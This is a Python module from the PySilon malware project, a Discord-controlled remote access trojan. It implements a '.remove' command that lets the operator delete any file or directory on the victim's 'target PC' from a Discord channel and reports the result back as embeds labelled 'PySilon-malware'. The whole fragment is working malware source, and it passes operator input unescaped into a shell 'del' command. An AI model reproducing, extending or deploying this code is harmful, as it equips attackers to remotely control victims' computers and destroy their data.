import os
from shutil import copy2, rmtree
from resources.misc import *
import subprocess
# end of imports
# on message
elif message.content[:7] == '.remove':
    #.log Message is "remove" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is file-related 
        if message.content.strip() == '.remove':
            #.log Author issued empty .remove 
            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            #.log Sent embed with usage of .remove 
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                #.log File/Directory requested by Author does exist on this PC 
                try:
                    if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                        subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                        #.log Removed a file 
                    else:
                        rmtree('/'.join(working_directory) + '/' + message.content[8:])
                        #.log Removed a directory 
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent embed about removal 
                except Exception as error:
                    #.log Error occurred while trying to remove a file/directory 
                    embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent embed with information about this error 
            else:
                #.log File/Directory requested by Author does not exist on this PC 
                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                #.log Sent embed about missing file/directory 
    else:
        #.log Message channel is not file-related 
        embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent embed about wrong channel 
